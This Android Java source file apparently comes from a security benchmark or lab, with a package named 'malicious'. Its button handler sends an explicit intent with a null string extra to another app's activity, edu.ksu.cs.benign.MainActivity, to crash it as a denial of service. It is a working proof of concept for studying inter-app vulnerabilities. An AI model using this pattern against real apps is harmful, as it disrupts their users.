package edu.ksu.cs.malicious;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

public class MalActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_mal);
    }

    @Override
    protected void onResume() {
        super.onResume();
        Button button = (Button) findViewById(R.id.dos);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                String a = null;
                intent.putExtra("s1","Happy DOS!");
                intent.putExtra("s2", a);
                intent.setComponent(new ComponentName("edu.ksu.cs.benign","edu.ksu.cs.benign.MainActivity"));
                startActivity(intent);
                Log.d("MAL", "Completed");
            }
        });
    }
}